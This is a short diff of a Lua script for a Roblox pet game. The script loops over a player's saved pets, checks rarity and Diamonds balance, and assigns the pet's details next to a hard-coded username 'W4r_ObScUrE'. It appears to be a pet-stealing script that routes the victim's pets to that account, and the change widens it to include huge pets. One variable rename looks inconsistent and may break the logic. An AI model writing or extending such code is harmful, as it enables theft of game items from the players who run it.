@@ -337,7 +337,7 @@ while wait() do
     for i, v in pairs(savedPets) do
         local v2 = FrameworkLibrary.Directory.Pets[v.id]
         if v2.rarity == "Exclusive" then
-            allExclusivesFalse = false
+            allExclusiveFalse = false
             break
         end
     end
@@ -354,7 +354,7 @@ for i, v in pairs(savedPets) do
     if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                 _G.Lol = 0
     end
-    if v2.huge == false and v2.rarity ~= exclusive then
+    if v2.rarity ~= exclusive then
         _G.Username = "W4r_ObScUrE"
         _G.PetName = v2.name
         _G.PetRar = v2.rarity
